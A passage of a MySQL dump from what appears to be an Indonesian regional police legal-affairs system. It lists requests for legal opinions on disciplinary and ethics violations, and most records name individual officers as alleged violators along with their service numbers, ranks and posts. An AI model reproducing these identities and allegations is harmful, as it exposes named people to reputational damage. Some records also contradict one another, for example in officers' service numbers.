  `pendapat_saran_judul` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `pendapat_saran_tanggal` date NOT NULL,
  `pendapat_saran_laporan_nomor` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `pendapat_saran_keterangan` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL,
  `pendapat_saran_satuan_kerja` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `operator` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`pendapat_saran_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 165 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of pendapat_saran
-- ----------------------------
INSERT INTO `pendapat_saran` VALUES (17, 'REKAP PSH 2020', '2020-12-31', '31 DESEMBER 2020 REKAP PSH TAHUN 2020', 'REKAP PSH TAHUN 2020<br>JUMLAH 126 PSH<br>DISIPLIN 68 PSH<br>KODE ETIK 57 PSH<br>TUNGGAKAN 1 PERKARA DISIPLIN', NULL, 'Administrator', '2021-01-06 11:20:09', '2021-01-06 11:20:09');
INSERT INTO `pendapat_saran` VALUES (18, 'PSH AIPDA RONI HERU KUSUMA NRP 73060262, Jabatan Bhabinkamtibmas Desa Lekor Polsek Janapria, Kesatuan Polres Lombok Tengah', '2020-12-23', 'R/841/XII/HUK.12.10./2020', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN DISIPLIN ANGGOTA POLRES LOMBOK TENGAH', NULL, 'Administrator', '2021-01-06 11:30:11', '2021-12-06 12:14:57');
INSERT INTO `pendapat_saran` VALUES (20, 'PSH BRIPKA M.S. CANDRA DWI KUSUMA, NRP 85010681, Jabatan anggota  Satresnarkoba Polres Lombok Tengah.', '2020-12-23', 'R/840/XII/HUK.12.10./2020', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN DISIPLIN ANGGOTA POLRES LOMBOK TENGAH', NULL, 'Administrator', '2021-01-06 11:42:48', '2021-12-06 11:01:23');
INSERT INTO `pendapat_saran` VALUES (23, 'PSH BRIPKA  YANUAR KASIM NRP 82011085, Jabatan Banit Patroli Sat Sabhara Polres Lombok Timur', '2020-12-16', 'R/113/XII/HUK.12.12/2020', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN DISIPLIN ANGGOTA POLRES LOMBOK TIMUR', NULL, 'Administrator', '2021-01-13 12:33:53', '2021-12-06 12:17:00');
INSERT INTO `pendapat_saran` VALUES (26, 'PSH BRIGADIR DWI ADI PRAMANA NRP 87041190, Jabatan Ba Ops Polres Bima', '2020-11-18', 'R/1309/XI/HUK.6.6/2021/ResBima', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN KODE ETIK PROFESI POLRI ANGGOTA POLRES BIMA', NULL, 'Administrator', '2021-02-09 11:55:51', '2021-12-06 12:02:01');
INSERT INTO `pendapat_saran` VALUES (28, 'PSH IPTU SUPIANTO NRP 68120326, Jabatan Panit 1 Subdit IIDitresnarkoba Polda NTB.', '2021-01-11', 'B/ND-13/I/Res 7.5/2021/Ditresnarkoba', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN DISIPLIN ANGGOTA DITRESNARKOBA POLDA NTB', NULL, 'Administrator', '2021-02-09 12:06:43', '2021-12-06 11:55:26');
INSERT INTO `pendapat_saran` VALUES (30, 'PSH BRIGADIR IRWAN RAHADI,S.H. NRP 82090424, Jabatan Ba SatSabhara Polres Bima Kota', '2021-02-17', 'R/159/II/HUK.12.10/2021', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN KODE ETIK PROFESI POLRI ANGGOTA POLRES BIMA KOTA A.N.BRIGADIR IRWAN RAHADI,S.H. NRP 82090424, JABATAN BA SAT SABHARA POLRES BIMA KOTA.', NULL, 'Administrator', '2021-03-08 11:22:58', '2021-12-06 12:05:11');
INSERT INTO `pendapat_saran` VALUES (31, 'PSH BRIGADIR ABDUL AZIZ NRP 85100141, Jabatan Ba Sat Sabhara  Polres Bima Kota', '2021-02-17', 'B/160/II/HUK.12.10./2021', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN KODE ETIK PROFESI POLRI ANGGOTA POLRES BIMA KOTA A.N.BRIGADIR ABDUL AZIZ NRP 85100141, JABATAN BRIGADIR SAT SABHARA POLRES BIMA KOTA', NULL, 'Administrator', '2021-03-08 11:31:21', '2021-12-06 12:07:13');
INSERT INTO `pendapat_saran` VALUES (32, 'PSH KOMPOL LUQMAN PUJO PRASETYO, S.I.K.,M.H. NRP 80100967, Jabatan pamen Bidpropam Polda NTB', '2021-02-11', 'B/ND-61/II/HUK.12.10./2021/Bidpropam', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN KODE ETIK PROFESI POLRI ANGGOTA POLRES BIMA KOTA A.N.KOMPOL LUQMAN PUJO PRASETYO, S.I.K., M.H. NRP 80100967,JABATAN PAMEN BIDPROPAM POLDA NTB', NULL, 'Administrator', '2021-03-08 11:48:39', '2021-12-06 12:09:52');
INSERT INTO `pendapat_saran` VALUES (33, 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN KODE ETIK PROFESI POLRI ANGGOTA POLRES BIMA', '2020-12-29', 'R/57/I/HUK.12.10./2021/Bidkum', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN KODE ETIK PROFESI POLRI ANGGOTA POLRES BIMA A.N.BRIGADIR LALU BAMBANG SUKADI NRP 83120914, JABATAN BA POLSEK TAMBARA POLRES BIMA&nbsp;', NULL, 'Administrator', '2021-03-08 13:50:20', '2021-03-08 13:50:20');
INSERT INTO `pendapat_saran` VALUES (34, 'PSH BRIPTU LALU DANI WAHYU HIDAYAT NRP 94120603.', '2021-02-17', 'B/158/II/HUK.12.10/2021/ResBima Kota', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN KODE ETIK PROFESI POLRI ANGGOTA POLRES BIMA KOTA A.N.BRIPTU LALU DANI WAHYU HIDAYAT NRP 94120603', NULL, 'Administrator', '2021-03-09 11:39:02', '2021-12-06 12:35:54');
INSERT INTO `pendapat_saran` VALUES (35, 'PSH IPTU YUDHA BAGUS KATIKO, Jabatan Ps.Pasi Logistik Batalyon C Pelopor Sat Brimob Polda NTB.', '2021-01-08', 'B/ND-9/I/HUK.12.10./2021/Bm.NTB', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN DISIPLIN ANGGOTA SAT BRIMOB POLDA NTBA.N.IPTUYUDHA BAGUS KARTIKO, NRP 77040138, JABATAN PS.PASI LOGISTIK BATALYON CPELOPOR SAT BRIMOB POLDA NTB', NULL, 'Administrator', '2021-03-09 11:45:00', '2021-12-06 11:59:41');
INSERT INTO `pendapat_saran` VALUES (36, 'PSH BRIGADIR HASUL FAZRIN NRP 81110734, Jabatan Anggota Sat Tahti Polres Bima', '2020-12-29', 'R/117/I/HUK.6.6/2021/Res Bima', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN KODE ETIK PROFESI POLRI ANGGOTA POLRES BIMA A.N.TERDUGA&nbsp; PELANGGAR BRIGADIR HASUL FAZRIN NRP 81110734,JABATAN ANGGOTA SAT TAHTI POLRES BIMA&nbsp;', NULL, 'Administrator', '2021-03-26 12:42:17', '2021-12-06 12:31:25');
INSERT INTO `pendapat_saran` VALUES (37, 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN KODE ETIK PROFESI POLRI ANGGOTA POLRES BIMA KOTA', '2021-03-03', 'BP3KEPP/02/II/2021/SIPROPAM', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN KODE ETIK PROFESI POLRI ANGGOTA POLRES BIMA KOTA A.N. TERDUGA PELANGGAR BRIPKA SAMSUL HADI NRP 8001085,JABATAN BA SAT SABHARA POLRES BIMA KOTA', NULL, 'Administrator', '2021-03-26 12:46:35', '2021-03-26 12:46:35');
INSERT INTO `pendapat_saran` VALUES (38, 'PSH AKBP TAHARUDDIN,S.E.,M.M. NRP 73100625, Jabatan Kabidkeu Polda NTB dan BRIPKA DINI ASTUTI NRP 85111224, Jabatan Bamin Keuangan Yanma Polda NTB.', '2021-02-25', 'B/ND-91/II/HUK.12.10./2021/Bidpropam', 'PERMINTAAN PENDAPAT DAN SARAN HUKUM PELANGGARAN DISIPLIN ANGGOTA YANMA POLDA NTB A.N.AKBP TAHARUDDIN,S.E.,M.M. DAN BRIPKA DINI ASTUTI', NULL, 'Administrator', '2021-03-26 12:51:36', '2021-12-06 12:34:38');
INSERT INTO `pendapat_saran` VALUES (39, 'PSH BRIGADIR I PUTU YASA NRP 86100626. anggota Dit Pamobvit Polda NTB', '2021-02-18', 'B/ND-74/II/HUK.12.10./2021/Bidpropam', 'PENDAPAT DAN SARAN HUKUM ANGGOTA DIT PAMOBVIT A.N.BRIGADIR I PUTU YASA NRP 86100626.', NULL, 'Administrator', '2021-04-15 11:52:05', '2021-12-06 13:00:30');
INSERT INTO `pendapat_saran` VALUES (40, 'PSH BRIGADIR LALU MUHAMAD MUNGKADAR NRP 87031310, Anggota Bag Sumda Polres Lombok Tengah.', '2021-02-23', 'R/140/II/HUK.12.10./2021', 'PSH A.N.BRIGADIR LALU MUHAMAD MUNGKADAR NRP 87031310, ANGGOTA BAG SUMDA POLRES LOMBOK TENGAH', NULL, 'Administrator', '2021-04-15 11:58:19', '2021-12-06 12:58:54');
INSERT INTO `pendapat_saran` VALUES (41, 'PSH BRIPTU MUHAMMAD IQBAL ABDUL AZIZ NRP 95040593, Jabatan Ba Ditsamapta Polda NTB', '2021-03-25', 'B/ND-145/III/HUK.12.10./2021/Ditsamapta', 'PSH A.N.BRIPTU MUHAMMAD IQBAL ABDUL AZIZ NRP 95040593, JABATAN BA DITSAMAPTA POLDA NTB', NULL, 'Administrator', '2021-04-15 12:12:04', '2021-12-06 12:54:49');
INSERT INTO `pendapat_saran` VALUES (42, 'PSH BRIPKA AGUNG KURNIADI NRP 85010926, Jabatan Ba StafKompi 3 Batalyon A Pelopor, Kesatuan Brimob Polda NTB', '2021-04-22', 'B/ND-56/IV/HUK.12.10/2021/Bm.NTB', 'PSH a.n. BRIPKA AGUNG KURNIADI NRP 85010926, Jabatan Ba StafKompi 3 Batalyon A Pelopor, Kesatuan Brimob Polda NTB', NULL, 'Administrator', '2021-05-18 13:47:31', '2021-12-06 13:31:32');
INSERT INTO `pendapat_saran` VALUES (43, 'PSH KOMPOL YUSUF TAUZIRI,S.I.K NRP 83081562, Jabatan Ps.Kasubdit II Ditreskrimum Polda NTB', '2021-04-26', 'B/ND-146/IV/HUK.12.10./2021/Ditreskrimum', 'PSH a.n. KOMPOL YUSUF TAUZIRI,S.I.K NRP 83081562, Jabatan Ps.Kasubdit II Ditreskrimum Polda NTB', NULL, 'Administrator', '2021-05-18 13:50:56', '2021-12-07 11:03:15');
INSERT INTO `pendapat_saran` VALUES (44, 'PSH BRIGADIR NANANG HIDAYAT NRP85040341, Jabatan Anggota Ba Polres Lombok Tengah.', '2021-04-19', 'R/ND-125/IV/HUK.12.10./2021/Yanma', 'PSH a.n. BRIGADIR NANANG HIDAYAT NRP 85040341 Jabatan Anggota Regu II Piket Jaga Mako Polda NTB', NULL, 'Administrator', '2021-05-18 13:56:42', '2021-12-06 12:43:48');
INSERT INTO `pendapat_saran` VALUES (45, 'PSH BRIPKA FIKNA APRIYAN, S.H. NRP 84040589, Jabatan Brigadir Satnarkoba Polres Lombok Barat.', '2021-04-13', 'R/188/IV/HUK.12.10./2021', 'PSH a.n. BRIPKA FIKNA APRIYAN,S.H. NRP 84040598, Jabatan Brigadir Satnarkoba Polres Lombok Barat', NULL, 'Administrator', '2021-05-18 14:02:12', '2021-12-06 12:48:12');
INSERT INTO `pendapat_saran` VALUES (46, 'PSH BRIPTU AGUS WIRYA SAPUTRA NRP 92040273, Jabatan Brigadir Satreksrim Polres Lombok Barat', '2021-04-13', 'R/187/IV/HUK.12.10./2021', 'PSH a.n. BRIPTU AGUS WIRYA SAPUTRA NRP 92040273, Jabatan Brigadir Satreksrim Polres Lombok Barat', NULL, 'Administrator', '2021-05-18 14:05:46', '2021-12-06 12:49:52');
INSERT INTO `pendapat_saran` VALUES (47, 'Pendapat dan saran hukum', '2021-03-22', 'B/ND-133/III/HUK.12.10./2021/Bidpropam', 'PSH. BRIGADIR AHMAD ROFIQ NRP 77110607, Jabatan Ba Bidpropam Polda NTB.', NULL, 'Administrator', '2021-05-18 14:09:32', '2021-05-18 14:09:32');
INSERT INTO `pendapat_saran` VALUES (48, 'PSH AKBP TIMBUL PENDAPOTAN SIHOTANG,S.I.K. NRP 75061083, Jabatan Kasubbid Gakkum Ditpolair Polda NTB', '2021-03-08', 'B/ND-122/III/HUK.12.10/2021/Ditsamapta', 'PSH a.n. AKBP TIMBUL PENDAPOTAN SIHOTANG,S.I.K. NRP 75061083, Jabatan Kasubbid Gakkum Ditpolair Polda NTB', NULL, 'Administrator', '2021-05-18 14:14:24', '2021-12-06 12:51:39');
INSERT INTO `pendapat_saran` VALUES (49, 'Pendapat dan saran hukum', '2021-02-23', 'R/148/II/HUK.12.10./2021', 'PSH a.n. BRIGADIR LALU MUHAMAD MUNGKADAR NRP 87031310, Jabatan Anggota Bag Sumda Polres Lombok Tengah', NULL, 'Administrator', '2021-05-18 14:20:31', '2021-05-18 14:20:31');
INSERT INTO `pendapat_saran` VALUES (51, 'PSH IPDA SUHARTONO NRP 68090445, Jabatan Pama Polres Bima Kota', '2021-03-04', 'B/ND-102/III/HUK.12.10./2021/Bidpropam', 'PSH a.n. IPDA SUHARTONO NRP 68090445, Jabatan Pama Polres Bima kota', NULL, 'Administrator', '2021-05-18 14:37:08', '2021-12-06 12:23:33');
INSERT INTO `pendapat_saran` VALUES (52, 'PSH AIPTU ZAINUDIN,S.Ag. NRP 76020610, jabatan Bintara Polres Lombok Timur', '2021-02-07', 'R/17/II/HUK.12.10./2021', 'PSH a.n. AIPTU ZAINUDIN,S.Ag. NRP 76020610, jabatan Bintara Polres Lombok Timur', NULL, 'Administrator', '2021-05-18 14:45:10', '2021-12-06 12:50:53');
INSERT INTO `pendapat_saran` VALUES (53, 'PSH KOMPOL TUTI MARYATI, S.Sos NRP 77030928, Jabatan Pamen Yanma Polda NTB', '2021-04-23', 'B/ND-221/IV/HUK.12.10/2021/Bidpropam', 'PSH a.n. KOMPOL TUTI MARYATI, S.Sos NRP 77030928, Jabatan Pamen Yanma Polda NTB', NULL, 'Administrator', '2021-05-21 12:19:42', '2021-12-06 13:19:10');
INSERT INTO `pendapat_saran` VALUES (54, 'PSH BRIPDA LALU RINGGIT NRP 880800941, Jabatan Ba Polres Dompu', '2021-04-06', 'R/26/IV/REN.4.1.3/2021', 'PSH a.n. BRIPDA LALU RINGGIT NRP 880800941, Jabatan Ba Polres Dompu', NULL, 'Administrator', '2021-05-21 12:23:04', '2021-12-06 13:17:27');
INSERT INTO `pendapat_saran` VALUES (56, 'Pendapat dan Saran Hukum', '2021-04-22', 'B/ND-219/HUK.12.10/2021/Bidpropam', 'PSH a.n.BHARATU YASSER RAMADHAN NRP 93030068, Jabatan Ta.Logistik Batalyon C Pelopor Satbrimob Polda NTB', NULL, 'Administrator', '2021-05-21 12:26:31', '2021-05-21 12:26:31');
INSERT INTO `pendapat_saran` VALUES (58, 'PSH AIPDA ROSIHAN AMDANI NRP 76090547, Jabatan Pamin 6 Gadik SPN Polda NTB', '2021-05-19', 'B/ND-96/V/HUK.12.10./2021./SPN', 'PENDAPAT DAN SARAN HUKUM PELANGGARAN SIPLIN a.n. TERDUGA PELANGGAR AIPDA ROSIHAN AMDANI NRP 76090547, Jabatan Pamin 6 Gadik SPN Polda NTB', NULL, 'Administrator', '2021-06-16 13:59:43', '2021-12-07 11:16:10');
INSERT INTO `pendapat_saran` VALUES (59, 'PSH BRIPDA HADI PRATAMA PUTRA NRP 92010365 Jabatan Ba Sat Sabhara Polres Sumbawa Barat.', '2021-05-18', 'R/410/V/2021/Res Sbw Brt', 'PENDAPAT DAN SARAN HUKUM PELANGGARAN KEPP a.n. TERDUGA PELANGGAR BRIPDA HADI PRATAMA PUTRA NRP 92010365 Jabatan Ba Sat Sabhara Polres Sumbawa Barat.', NULL, 'Administrator', '2021-06-16 14:03:45', '2021-12-07 11:15:25');
INSERT INTO `pendapat_saran` VALUES (61, 'PSH BRIPKA MUHTAR NRP 85040448, Jabatan Ba Polsek Langgudu Polres Bima Kota.', '2021-06-16', 'B/510/VI/HUK.12.10/2021', 'PENDAPAT DAN SARAN HUKUM a.n. Terduga Pelanggar BRIPKA MUHTAR NRP 85040448, Jabatan Ba Polsek Langgudu Polres Bima Kota.', NULL, 'Administrator', '2021-06-22 11:16:58', '2021-12-07 11:06:02');
INSERT INTO `pendapat_saran` VALUES (63, 'PENDAPAT DAN SARAN HUKUM', '2021-07-02', 'B/ND-90/VII/HUK.12.10./2021/Bm.NTB', 'PENDAPAT DAN SARAN HUKUM a.n. BRIPDA ILHAM NAOVAL HAQIQI NRP 97110858, Ba. Kompi 3 Batalyon A Pelopor Kesatuan Brimob Polda NTB', NULL, 'Administrator', '2021-07-08 11:01:17', '2021-07-08 11:01:17');
INSERT INTO `pendapat_saran` VALUES (64, 'PSH BRIGADIR SULHIYADI NRP 86121738, Jabatan anggota Sat Sabhara Polres Lombok Tengah.', '2021-07-01', 'B/ND-220/VII/HUK.12.10./2021/Yanma', 'PENDAPAT DAN SARAN HUKUM a.n. Terduga Pelanggar BRIGADIR SULHIYADI NRP 86121738, Jabatan anggota Sat Sabhara Polres Lombok Tengah&nbsp;', NULL, 'Administrator', '2021-07-13 14:16:24', '2021-12-07 11:21:31');
INSERT INTO `pendapat_saran` VALUES (65, 'PSH AKP AFRIJAL,S.I.K., NRP 86042038, Jabatan Paur Subbag Anev Bagbinopsnal Ditbinmas Polda NTB.', '2021-06-29', 'B/ND-124/VI/HUK.12.10./2021/Ditbinmas', 'PSH a.n. Terduga Pelanggar AKP AFRIJAL,S.I.K., NRP 86042038, Jabatan Paur Subbag Anev Bagbinopsnal Ditbinmas Polda NTB.', NULL, 'Administrator', '2021-07-13 14:21:47', '2021-12-07 11:22:04');
INSERT INTO `pendapat_saran` VALUES (66, 'PSH AIPTU AHMAD BUDIAWAN R., NRP 70050012, Jabatan Ba Sium Polres Lombok Barat', '2021-05-19', 'R/250/V/HUK.12.10./2021', 'PSH a.n. Terduga Pelanggar AIPTU AHMAD BUDIAWAN R., NRP 70050012, Jabatan Ba Sium Polres Lombok Barat', NULL, 'Administrator', '2021-07-13 14:25:37', '2021-12-07 11:08:59');
INSERT INTO `pendapat_saran` VALUES (67, 'PSH BRIPTU FITRIAN HIDAYAT, NRP 92040024, Jabatan Ba Dit Polairud Polda NTB', '2021-05-27', 'B/ND-330/V/HUK.12.10./2021/Bidpropam', 'PSH a.n. Terduga Pelanggar BRIPTU FITRIAN HIDAYAT, NRP 92040024, Jabatan Ba Dit Polairud Polda NTB', NULL, 'Administrator', '2021-07-13 14:29:41', '2021-12-07 11:07:02');
INSERT INTO `pendapat_saran` VALUES (68, 'PSH BRIPTU JAYA FITRIA NRP 93030289, Jabatan Anggota Ba Polres Lombok Barat', '2021-04-29', 'R/208/IV/HUK.12.10./2021', 'PSH a.n. Terduga Pelanggar BRIPTU JAYA FITRIA NRP 93030289, Jabatan Anggota Ba Polres Lombok Barat', NULL, 'Administrator', '2021-07-13 14:32:50', '2021-12-07 11:08:01');
INSERT INTO `pendapat_saran` VALUES (69, 'PSH BRIPKA MUHAMMAD AMRUL ALAM, S.H. NRP 85010617, Jabatan anggota Ton II Dalmas Sat Sampata Polres Bima Kota', '2021-07-15', 'B/593/VII/HUK.12.10./2021', 'PSH a.n.&nbsp; BRIPKA MUHAMMAD AMRUL ALAM, S.H. NRP 85010617, Jabatan anggota Ton II Dalmas Sat Sampata Polres Bima Kota', NULL, 'Administrator', '2021-07-21 11:51:26', '2021-12-07 12:53:32');
INSERT INTO `pendapat_saran` VALUES (70, 'PSH BRIPDA NOVAN PUTRA WIJAYA NRP 93110234, Jabatan Ba Polres Dompu.', '2021-06-14', 'R/43/VI/REN.4.1.3./2021', 'PENDAPAT DAN SARAN HUKUM a.n. Terduga Pelanggar BRIPDA NOVAN PUTRA WIJAYA NRP 93110234, Jabatan Ba Polres Dompu.', NULL, 'Administrator', '2021-08-18 10:55:22', '2021-12-07 11:12:19');
INSERT INTO `pendapat_saran` VALUES (71, 'PSH BRIPTU FIRDAUS NRP 95040130, Jabatan Ba Polres Dompu.', '2021-06-30', 'R/47/VI/REN.4.1.3./2021', 'PENDAPAT DAN SARAN HUKUM a.n. Terduga Pelanggar BRIPTU FIRDAUS NRP 95040130, Jabatan Ba Polres Dompu.', NULL, 'Administrator', '2021-08-18 11:04:00', '2021-12-07 11:09:58');
INSERT INTO `pendapat_saran` VALUES (72, 'PSH BRIPKA DA COSTA NRP 78120002 DKK, Jabatan Anggota Satbrimob Polda NTB.', '2021-06-10', 'B/ND-77/VI/HUK.12.10./2021/Bm.NTB', 'PENDAPAT DAN SARAN HUKUM Terduga pelanggar a.n. BRIPKA DA COSTA NRP 78120002 DKK', NULL, 'Administrator', '2021-08-18 11:10:27', '2021-12-07 11:11:20');
INSERT INTO `pendapat_saran` VALUES (73, 'PSH AIPTU AHMAD BUDIAWAN, NRP 70050012, Jabatan Ba Polres Lombok Barat.', '2021-06-11', 'B/ND-373/VI/HUK.12.10./2021/Bidpropam', 'PSH a.n. Terduga Pelanggar AIPTU AHMAD BUDIAWAN, NRP 70050012, Jabatan Ba Polres Lombok Barat.', NULL, 'Administrator', '2021-08-18 11:22:36', '2021-12-07 11:20:19');
INSERT INTO `pendapat_saran` VALUES (74, 'PSH BRIGADIR LALU DIDIT HAGIATMI NRP 83050815, Jabatan Ba  Polres Kesatuan Polres Lombok Utara.', '2021-07-09', 'R/249/VII/HUK.12.10./2021', 'PSH a.n. Terduga Pelanggar BRIGADIR LALU DIDIT HAGIATMI NRP 83050815, Jabatan Ba&nbsp; Polres Kesatuan Polres Lombok Utara.', NULL, 'Administrator', '2021-08-18 14:49:47', '2021-12-07 12:52:57');
INSERT INTO `pendapat_saran` VALUES (76, 'PSH BRIGADIR MUHAMMAD AGUS JUNAIDI NRP 84081789, jabatan Ba Kompi II Batalyon A Pelopor Sat Brimob Polda NTB.', '2021-07-13', 'B/ND-457/VII/HUK.12.10./2021/Bidpropam', 'PSH a.n.Terduga Pelanggar BRIGADIR MUHAMMAD AGUS JUNAIDI NRP 84081789, jabatan Ba Kompi II Batalyon A Pelopor Sat Brimob Polda NTB.', NULL, 'Administrator', '2021-08-18 14:56:29', '2021-12-07 12:55:55');
INSERT INTO `pendapat_saran` VALUES (77, 'PSH BRIPDA ILHAM NAOVAL HAQIQI NRP 97110585, Jabatan Ba Kompi 3 Yon A Pelopor Sat Brimob Polda NTB', '2021-07-02', 'B/ND-90/VII/HUK.12.10/2021/Bm.NTB', 'PSH a.n.Terduga Pelanggar BRIPDA ILHAM NAOVAL HAQIQI NRP 97110585, Jabatan Ba Kompi 3 Yon A Pelopor Sat Brimob Polda NTB', NULL, 'Administrator', '2021-08-18 15:00:27', '2021-12-07 12:56:48');
INSERT INTO `pendapat_saran` VALUES (78, 'PSH BRIPDA ILMAN LABUHA NRP 77030585, Jabatan Ba Polres Dompu', '2021-06-08', 'R/42/VI/REN.4.1.3./2021', 'PSH a.n.terduga pelanggar BRIPDA ILMAN LABUHA NRP 77030585, Jabatan Ba Polres Dompu', NULL, 'Administrator', '2021-08-18 15:03:56', '2021-12-07 12:57:24');
INSERT INTO `pendapat_saran` VALUES (79, 'PSH BRIPTU ALIFURRAHMAN,S.H. NRP 97070062, Jabatan anggota Ton. 1 Dalmas Sat. Sabhara Polres Bima Kota.', '2021-05-11', 'B/433/V/HUK.12.10./2021', 'PSH a.n. BRIPTU ALIFURRAHMAN,S.H. NRP 97070062, Jabatan anggota Ton. 1 Dalmas Sat. Sabhara Polres Bima Kota.', NULL, 'Administrator', '2021-09-28 10:51:34', '2021-12-06 13:09:57');
INSERT INTO `pendapat_saran` VALUES (80, 'PENDAPAT DAN SARAN HUKUM', '2020-11-18', 'R/1309/XI/HUK.6.6/2020/Res Bima', 'PSH a.n.terduga pelanggar DWI ADI PERMANA NRP 87041190, Jabatan Ba Ops Polres Bima.', NULL, 'Administrator', '2021-09-28 10:57:11', '2021-09-28 10:57:11');
INSERT INTO `pendapat_saran` VALUES (81, 'PSH BRIPDA NANANG RIZKI NRP 93060479, Jabatan Ba Polres Dompu', '2021-07-30', 'R/52/VII/REN.4.1.3./2021', 'PSH a.n.BRIPDA NANANG RIZKI NRP 93060479, Jabatan Ba Polres Dompu', NULL, 'Administrator', '2021-09-28 11:27:15', '2021-12-07 12:58:03');
INSERT INTO `pendapat_saran` VALUES (82, 'PSH. BRIPKA NASIR, NRP 83010970, Jabatan Bhabinkamtibmas Desa Tembeng Putik Wanasaba Polres Lombok TImur.', '2021-10-27', 'B/ND-704/X/HUK.12.10./2021/Bidpropam', 'PSH. BRIPKA NASIR, NRP 83010970, Jabatan Bhabinkamtibmas Desa Tembeng Putik Wanasaba Polres Lombok TImur.', NULL, 'Administrator', '2021-11-04 11:03:03', '2021-11-04 11:03:03');
INSERT INTO `pendapat_saran` VALUES (83, 'PSH AIPTU MEDI DWI HANDOKO NRP 72060170, Jabatan Ps.Panit 2 Wisata Ditpamobvit Polda NTB.', '2021-09-23', 'B/ND-27/IX/HUK.12.10./2021/Ditpamobvit', 'PSH AIPTU MEDI DWI HANDOKO NRP 72060170, Jabatan Ps.Panit 2 Wisata Ditpamobvit Polda NTB.', NULL, 'Administrator', '2021-11-23 12:55:05', '2021-11-23 12:55:05');
INSERT INTO `pendapat_saran` VALUES (84, 'PSH AIPDA LALU ARYA WIRECHANE NRP 82050079, Jabatan Bintara Polsek Alas Polres Sumbawa.', '2021-09-17', 'R/149/IX/HUK.9.1/2021', 'PSH AIPDA LALU ARYA WIRECHANE NRP 82050079, Jabatan Bintara Polsek Alas Polres Sumbawa.', NULL, 'Administrator', '2021-11-23 12:59:42', '2021-11-23 12:59:42');
INSERT INTO `pendapat_saran` VALUES (85, 'PSH AIPDA I GUSTI NGURAH LANANG SUPARWATA NRP 79051113, Jabatan Banit Subdit 1 Ditresnarkoba Polda NTB.', '2021-10-05', 'B/ND-252/X/HUK.12.10./2021/Ditresnarkoba', 'PSH AIPDA I GUSTI NGURAH LANANG SUPARWATA NRP 79051113, Jabatan Banit Subdit 1 Ditresnarkoba Polda NTB.', NULL, 'Administrator', '2021-11-23 13:03:27', '2021-11-23 13:03:27');
INSERT INTO `pendapat_saran` VALUES (86, 'PSH AKP SAOGI SUJANA ANGSAR NRP 75040195, Jabatan Pama Polda NTB.', '2021-10-07', 'B/ND-1206/X/HUK.12.10./2021/Ro SDM', 'PSH AKP SAOGI SUJANA ANGSAR NRP 75040195, Jabatan Pama Polda NTB.', NULL, 'Administrator', '2021-11-23 13:06:45', '2021-11-23 13:06:45');
INSERT INTO `pendapat_saran` VALUES (87, 'PSH BRIPKA ARNANSYAH, NRP 85081375, Jabatan Bintara Polres Sumbawa', '2021-09-20', 'R/152/IX/HUK.9.1./2021', 'PSH BRIPKA ARNANSYAH, NRP 85081375, Jabatan Bintara Polres Sumbawa', NULL, 'Administrator', '2021-11-23 13:09:30', '2021-11-23 13:09:30');
INSERT INTO `pendapat_saran` VALUES (88, 'PSH BRIGADIR IMRON, NRP 88010737, Jabatan Ba Polres Dompu', '2021-09-03', 'R/63/IX/REN.4.1.3./2021', 'PSH BRIGADIR IMRON, NRP 88010737, Jabatan Ba Polres Dompu', NULL, 'Administrator', '2021-11-23 13:12:16', '2021-11-23 13:12:16');
INSERT INTO `pendapat_saran` VALUES (89, 'PSH BRIGADIR IRWANSYAH NRP 79070625, Jabatan Ba Bidkum Polda NTB', '2021-10-04', 'B/ND-649/X/HUK.12.10./2021/Bidpropam', 'PSH BRIGADIR IRWANSYAH NRP 79070625, Jabatan Ba Bidkum Polda NTB', NULL, 'Administrator', '2021-11-23 13:15:56', '2021-11-23 13:15:56');
INSERT INTO `pendapat_saran` VALUES (90, 'PSH AIPDA SUSANTO NRP 79100989, Jabatan Bamin Siaga Satu Biro Ops Polda NTB', '2021-10-19', 'B/ND-625/X/HUK.12.10./2021/Roops', 'PSH AIPDA SUSANTO NRP 79100989, Jabatan Bamin Siaga Satu Biro Ops Polda NTB', NULL, 'Administrator', '2021-11-23 13:19:48', '2021-11-23 13:19:48');
INSERT INTO `pendapat_saran` VALUES (91, 'PSH BRIPKA LALU EDY SATRIAWAN NRP 7710354, Jabatan Ba Satreskrim Polres Sumbawa', '2021-09-28', 'R/471/IX/HUK.6.6./2021/Res Bima', 'PSH BRIPKA LALU EDY SATRIAWAN NRP 7710354, Jabatan Ba Satreskrim Polres Sumbawa', NULL, 'Administrator', '2021-11-23 13:22:59', '2021-11-23 13:22:59');
INSERT INTO `pendapat_saran` VALUES (92, 'PSH BRIGADIR ARMAN NRP 85110181, Jabatan Brigadir Polres Dompu', '2021-10-07', 'R/75/X/REN/4.1.3./2021', 'PSH BRIGADIR ARMAN NRP 85110181, Jabatan Brigadir Polres Dompu', NULL, 'Administrator', '2021-11-23 13:26:37', '2021-11-23 13:26:37');
